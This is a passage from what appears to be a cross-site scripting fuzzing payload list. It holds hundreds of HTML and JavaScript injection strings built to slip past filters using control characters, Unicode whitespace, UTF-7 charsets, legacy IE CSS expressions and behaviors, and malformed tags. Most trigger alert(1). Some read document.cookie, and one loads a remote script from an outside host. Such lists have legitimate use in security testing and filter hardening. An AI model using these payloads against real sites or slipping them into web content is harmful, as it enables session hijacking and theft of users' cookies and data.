style=\"font-family:\'foo\'\\x7Dx:expression(javascript:alert(1);/*\';\">DEF  \"\'`>ABC<div style=\"font-family:\'foo\'\\x3Bx:expression(javascript:alert(1);/*\';\">DEF  <script>if(\"x\\\\xE1\\x96\\x89\".length==2) { javascript:alert(1);}</script> <script>if(\"x\\\\xE0\\xB9\\x92\".length==2) { javascript:alert(1);}</script> <script>if(\"x\\\\xEE\\xA9\\x93\".length==2) { javascript:alert(1);}</script> \'`\"><\\x3Cscript>javascript:alert(1)</script> \'`\"><\\x00script>javascript:alert(1)</script> \"\'`><\\x3Cimg src=xxx:x onerror=javascript:alert(1)> \"\'`><\\x00img src=xxx:x onerror=javascript:alert(1)> <script src=\"data:text/plain\\x2Cjavascript:alert(1)\"></script> <script src=\"data:\\xD4\\x8F,javascript:alert(1)\"></script> <script src=\"data:\\xE0\\xA4\\x98,javascript:alert(1)\"></script> <script src=\"data:\\xCB\\x8F,javascript:alert(1)\"></script> <script\\x20type=\"text/javascript\">javascript:alert(1);</script> <script\\x3Etype=\"text/javascript\">javascript:alert(1);</script> <script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script> <script\\x09type=\"text/javascript\">javascript:alert(1);</script> <script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script> <script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script> <script\\x0Atype=\"text/javascript\">javascript:alert(1);</script> ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF <a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a> `\"\'><img src=xxx:x \\x0Aonerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x22onerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x0Bonerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x0Donerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x2Fonerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x09onerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x0Conerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x00onerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x27onerror=javascript:alert(1)> `\"\'><img src=xxx:x \\x20onerror=javascript:alert(1)> \"`\'><script>\\x3Bjavascript:alert(1)</script> \"`\'><script>\\x0Djavascript:alert(1)</script> \"`\'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x81javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x84javascript:alert(1)</script> \"`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script> \"`\'><script>\\x09javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x89javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x85javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x88javascript:alert(1)</script> \"`\'><script>\\x00javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\xA8javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script> \"`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script> \"`\'><script>\\x0Cjavascript:alert(1)</script> \"`\'><script>\\x2Bjavascript:alert(1)</script> \"`\'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script> \"`\'><script>-javascript:alert(1)</script> \"`\'><script>\\x0Ajavascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script> \"`\'><script>\\x7Ejavascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x87javascript:alert(1)</script> \"`\'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\xA9javascript:alert(1)</script> \"`\'><script>\\xC2\\x85javascript:alert(1)</script> \"`\'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x83javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script> \"`\'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x80javascript:alert(1)</script> \"`\'><script>\\x21javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x82javascript:alert(1)</script> \"`\'><script>\\xE2\\x80\\x86javascript:alert(1)</script> \"`\'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script> \"`\'><script>\\x0Bjavascript:alert(1)</script> \"`\'><script>\\x20javascript:alert(1)</script> \"`\'><script>\\xC2\\xA0javascript:alert(1)</script> \"/><img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x /> \"/><img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x /> \"/><img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x /> \"/><img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x /> \"/><img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x /> \"/><img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x /> \"/><img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x /> \"/><img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x /> \"/><img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x /> <script\\x2F>javascript:alert(1)</script> <script\\x20>javascript:alert(1)</script> <script\\x0D>javascript:alert(1)</script> <script\\x0A>javascript:alert(1)</script> <script\\x0C>javascript:alert(1)</script> <script\\x00>javascript:alert(1)</script> <script\\x09>javascript:alert(1)</script> \"><img src=x onerror=javascript:alert(1)> \"><img src=x onerror=javascript:alert(\'1\')> \"><img src=x onerror=javascript:alert(\"1\")> \"><img src=x onerror=javascript:alert(`1`)> \"><img src=x onerror=javascript:alert((\'1\'))> \"><img src=x onerror=javascript:alert((\"1\"))> \"><img src=x onerror=javascript:alert((`1`))> \"><img src=x onerror=javascript:alert(A)> \"><img src=x onerror=javascript:alert((A))> \"><img src=x onerror=javascript:alert((\'A\'))> \"><img src=x onerror=javascript:alert(\'A\')> \"><img src=x onerror=javascript:alert((\"A\"))> \"><img src=x onerror=javascript:alert(\"A\")> \"><img src=x onerror=javascript:alert((`A`))> \"><img src=x onerror=javascript:alert(`A`)> `\"\'><img src=xxx:x onerror\\x0B=javascript:alert(1)> `\"\'><img src=xxx:x onerror\\x00=javascript:alert(1)> `\"\'><img src=xxx:x onerror\\x0C=javascript:alert(1)> `\"\'><img src=xxx:x onerror\\x0D=javascript:alert(1)> `\"\'><img src=xxx:x onerror\\x20=javascript:alert(1)> `\"\'><img src=xxx:x onerror\\x0A=javascript:alert(1)> `\"\'><img src=xxx:x onerror\\x09=javascript:alert(1)> <script>javascript:alert(1)<\\x00/script> <img src=# onerror\\x3D\"javascript:alert(1)\" > <input onfocus=javascript:alert(1) autofocus> <input onblur=javascript:alert(1) autofocus><input autofocus> <video poster=javascript:javascript:alert(1)// <body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus> <form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X <video><source onerror=\"javascript:javascript:alert(1)\"> <video onerror=\"javascript:javascript:alert(1)\"><source> <form><button formaction=\"javascript:javascript:alert(1)\">X <body oninput=javascript:alert(1)><input autofocus> <math href=\"javascript:javascript:alert(1)\">CLICKME</math>  <math> <maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:javascript:alert(1)\">CLICKME</maction> </math> <frameset onload=javascript:alert(1)> <table background=\"javascript:javascript:alert(1)\"> <!--<img src=\"--><img src=x onerror=javascript:alert(1)//\"> <comment><img src=\"</comment><img src=x onerror=javascript:alert(1))//\"> <![><img src=\"]><img src=x onerror=javascript:alert(1)//\"> <style><img src=\"</style><img src=x onerror=javascript:alert(1)//\"> <li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div> <head><base href=\"javascript://\"></head><body><a href=\"/. /,javascript:alert(1)//#\">XXX</a></body> <SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT> <OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT> <object data=\"data:text/html;base64,%(base64)s\"> <embed src=\"data:text/html;base64,%(base64)s\"> <b <script>alert(1)</script>0 <div id=\"div1\"><input value=\"``onmouseover=javascript:alert(1)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script> <x \'=\"foo\"><x foo=\'><img src=x onerror=javascript:alert(1)//\'> <embed src=\"javascript:alert(1)\"> <img src=\"javascript:alert(1)\"> <image src=\"javascript:alert(1)\"> <script src=\"javascript:alert(1)\"> <div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x <? foo=\"><script>javascript:alert(1)</script>\"> <! foo=\"><script>javascript:alert(1)</script>\"> </ foo=\"><script>javascript:alert(1)</script>\"> <? foo=\"><x foo=\'?><script>javascript:alert(1)</script>\'>\"> <! foo=\"[[[Inception]]\"><x foo=\"]foo><script>javascript:alert(1)</script>\"> <% foo><x foo=\"%><script>javascript:alert(1)</script>\"> <div id=d><x xmlns=\"><iframe onload=javascript:alert(1)\"></div> <script>d.innerHTML=d.innerHTML</script> <img \\x00src=x onerror=\"alert(1)\"> <img \\x47src=x onerror=\"javascript:alert(1)\"> <img \\x11src=x onerror=\"javascript:alert(1)\"> <img \\x12src=x onerror=\"javascript:alert(1)\"> <img\\x47src=x onerror=\"javascript:alert(1)\"> <img\\x10src=x onerror=\"javascript:alert(1)\"> <img\\x13src=x onerror=\"javascript:alert(1)\"> <img\\x32src=x onerror=\"javascript:alert(1)\"> <img\\x47src=x onerror=\"javascript:alert(1)\"> <img\\x11src=x onerror=\"javascript:alert(1)\"> <img \\x47src=x onerror=\"javascript:alert(1)\"> <img \\x34src=x onerror=\"javascript:alert(1)\"> <img \\x39src=x onerror=\"javascript:alert(1)\"> <img \\x00src=x onerror=\"javascript:alert(1)\"> <img src\\x09=x onerror=\"javascript:alert(1)\"> <img src\\x10=x onerror=\"javascript:alert(1)\"> <img src\\x13=x onerror=\"javascript:alert(1)\"> <img src\\x32=x onerror=\"javascript:alert(1)\"> <img src\\x12=x onerror=\"javascript:alert(1)\"> <img src\\x11=x onerror=\"javascript:alert(1)\"> <img src\\x00=x onerror=\"javascript:alert(1)\"> <img src\\x47=x onerror=\"javascript:alert(1)\"> <img src=x\\x09onerror=\"javascript:alert(1)\"> <img src=x\\x10onerror=\"javascript:alert(1)\"> <img src=x\\x11onerror=\"javascript:alert(1)\"> <img src=x\\x12onerror=\"javascript:alert(1)\"> <img src=x\\x13onerror=\"javascript:alert(1)\"> <img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\"> <img src=x onerror=\\x09\"javascript:alert(1)\"> <img src=x onerror=\\x10\"javascript:alert(1)\"> <img src=x onerror=\\x11\"javascript:alert(1)\"> <img src=x onerror=\\x12\"javascript:alert(1)\"> <img src=x onerror=\\x32\"javascript:alert(1)\"> <img src=x onerror=\\x00\"javascript:alert(1)\"> <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a> <img src=\"x` `<script>javascript:alert(1)</script>\"` `> <img src onerror /\" \'\"= alt=javascript:alert(1)//\"> <title onpropertychange=javascript:alert(1)></title><title title=> <a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\"> <!--[if]><script>javascript:alert(1)</script --> <!--[if<img src=x onerror=javascript:alert(1)//]> --> <script src=\"/\\%(jscript)s\"></script> <script src=\"\\\\%(jscript)s\"></script> <object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object> <object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"javascript:alert(1)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object> <a style=\"-o-link:\'javascript:javascript:alert(1)\';-o-link-source:current\">X <style>p[foo=bar{}*{-o-link:\'javascript:javascript:alert(1)\'}{}*{-o-link-source:current}]{color:red};</style> <link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d <style>@import \"data:,*%7bx:expression(javascript:alert(1))%7D\";</style> <a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"javascript:alert(1);\">XXX</a></a><a href=\"javascript:javascript:alert(1)\">XXX</a> <style>*[{}@import\'%(css)s?]</style>X <div style=\"font-family:\'foo&#10;;color:red;\';\">XXX <div style=\"font-family:foo}color=red;\">XXX <// style=x:expression\\28javascript:alert(1)\\29> <style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style> <div style=content:url(%(svg)s)></div> <div style=\"list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));\">X <div id=d><div style=\"font-family:\'sans\\27\\3B color\\3Ared\\3B\'\">X</div></div> <script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script> <div style=\"background:url(/f#&#127;oo/;color:red/*/foo.jpg);\">X <div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X <div id=\"x\">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style> <x style=\"background:url(\'x&#1;;color:red;/*\')\">XXX</x> <script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script> <script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script> <script>ReferenceError.prototype.__defineGetter__(\'name\', function(){javascript:alert(1)}),x</script> <script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'javascript:alert(1)\')()</script> <meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi <meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&> <meta charset=\"mac-farsi\">¼script¾javascript:alert(1)¼/script¾ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` > 1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`> 1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;> <vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe> 1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a> <a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:javascript:alert(1)\">XXX</a> <x style=\"behavior:url(%(sct)s)\"> <xml id=\"xss\" src=\"%(htc)s\"></xml> <label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label> <event-source src=\"%(event)s\" onload=\"javascript:alert(1)\"> <a href=\"javascript:javascript:alert(1)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\"> <div id=\"x\">x</div> <xml:namespace prefix=\"t\"> <import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;\"> <script>%(payload)s</script> <script src=%(jscript)s></script> <script language=\'javascript\' src=\'%(jscript)s\'></script> <script>javascript:alert(1)</script> <IMG SRC=\"javascript:javascript:alert(1);\"> <IMG SRC=javascript:javascript:alert(1)> <IMG SRC=`javascript:javascript:alert(1)`> <SCRIPT SRC=%(jscript)s?<B> <FRAMESET><FRAME SRC=\"javascript:javascript:alert(1);\"></FRAMESET> <BODY ONLOAD=javascript:alert(1)> <BODY ONLOAD=javascript:javascript:alert(1)> <IMG SRC=\"jav ascript:javascript:alert(1);\"> <BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)> <SCRIPT/SRC=\"%(jscript)s\"></SCRIPT> <<SCRIPT>%(payload)s//<</SCRIPT> <IMG SRC=\"javascript:javascript:alert(1)\" <iframe src=%(scriptlet)s < <INPUT TYPE=\"IMAGE\" SRC=\"javascript:javascript:alert(1);\"> <IMG DYNSRC=\"javascript:javascript:alert(1)\"> <IMG LOWSRC=\"javascript:javascript:alert(1)\"> <BGSOUND SRC=\"javascript:javascript:alert(1);\"> <BR SIZE=\"&{javascript:alert(1)}\"> <LAYER SRC=\"%(scriptlet)s\"></LAYER> <LINK REL=\"stylesheet\" HREF=\"javascript:javascript:alert(1);\"> <STYLE>@import\'%(css)s\';</STYLE> <META HTTP-EQUIV=\"Link\" Content=\"<%(css)s>; REL=stylesheet\"> <XSS STYLE=\"behavior: url(%(htc)s);\"> <STYLE>li {list-style-image: url(\"javascript:javascript:alert(1)\");}</STYLE><UL><LI>XSS <META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:javascript:alert(1);\"> <META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:javascript:alert(1);\"> <IFRAME SRC=\"javascript:javascript:alert(1);\"></IFRAME> <TABLE BACKGROUND=\"javascript:javascript:alert(1)\"> <TABLE><TD BACKGROUND=\"javascript:javascript:alert(1)\"> <DIV STYLE=\"background-image: url(javascript:javascript:alert(1))\"> <DIV STYLE=\"width:expression(javascript:alert(1));\"> <IMG STYLE=\"xss:expr/*XSS*/ession(javascript:alert(1))\"> <XSS STYLE=\"xss:expression(javascript:alert(1))\"> <STYLE TYPE=\"text/javascript\">javascript:alert(1);</STYLE> <STYLE>.XSS{background-image:url(\"javascript:javascript:alert(1)\");}</STYLE><A CLASS=XSS></A> <STYLE type=\"text/css\">BODY{background:url(\"javascript:javascript:alert(1)\")}</STYLE> <!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]--> <BASE HREF=\"javascript:javascript:alert(1);//\"> <OBJECT TYPE=\"text/x-scriptlet\" DATA=\"%(scriptlet)s\"></OBJECT> <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT> <HTML xmlns:xss><?import namespace=\"xss\" implementation=\"%(htc)s\"><xss:xss>XSS</xss:xss></HTML>\"\"\",\"XML namespace.\"),(\"\"\"<XML ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:javascript:alert(1)\"&gt;</B></I></XML><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN> <HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;\"></BODY></HTML> <SCRIPT SRC=\"%(jpg)s\"></SCRIPT> <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4- <form id=\"test\" /><button form=\"test\" formaction=\"javascript:javascript:alert(1)\">X <body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus> <P STYLE=\"behavior:url(\'#default#time2\')\" end=\"0\" onEnd=\"javascript:alert(1)\"> <STYLE>@import\'%(css)s\';</STYLE> <STYLE>a{background:url(\'s1\' \'s2)}@import javascript:javascript:alert(1);\');}</STYLE> <meta charset= \"x-imap4-modified-utf7\"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&> <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT> <style onreadystatechange=javascript:javascript:alert(1);></style> <?xml version=\"1.0\"?><html:html xmlns:html=\'http://www.w3.org/1999/xhtml\'><html:script>javascript:alert(1);</html:script></html:html> <embed code=%(scriptlet)s></embed> <embed code=javascript:javascript:alert(1);></embed> <embed src=%(jscript)s></embed> <frameset onload=javascript:javascript:alert(1)></frameset> <object onerror=javascript:javascript:alert(1)> <embed type=\"image\" src=%(scriptlet)s></embed> <XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]<![CDATA[cript:javascript:alert(1);\">]]</C><X></xml> <IMG SRC=&{javascript:alert(1);};> <a href=\"jav&#65ascript:javascript:alert(1)\">test1</a> <a href=\"jav&#97ascript:javascript:alert(1)\">test1</a> <embed width=500 height=500 code=\"data:text/html,<script>%(payload)s</script>\"></embed> <iframe srcdoc=\"&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>\"> \';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\"; alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> \'\';!--\"<XSS>=&{()} <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> <IMG SRC=\"javascript:alert(\'XSS\');\"> <IMG SRC=javascript:alert(\'XSS\')> <IMG SRC=JaVaScRiPt:alert(\'XSS\')> <IMG SRC=javascript:alert(\"XSS\")> <IMG SRC=`javascript:alert(\"RSnake says, \'XSS\'\")`> <a onmouseover=\"alert(document.cookie)\">xxs link</a> <a onmouseover=alert(document.cookie)>xxs link</a> <IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"> <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> <IMG SRC=# onmouseover=\"alert(\'xxs\')\"> <IMG SRC= onmouseover=\"alert(\'xxs\')\"> <IMG onmouseover=\"alert(\'xxs\')\"> <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> <IMG 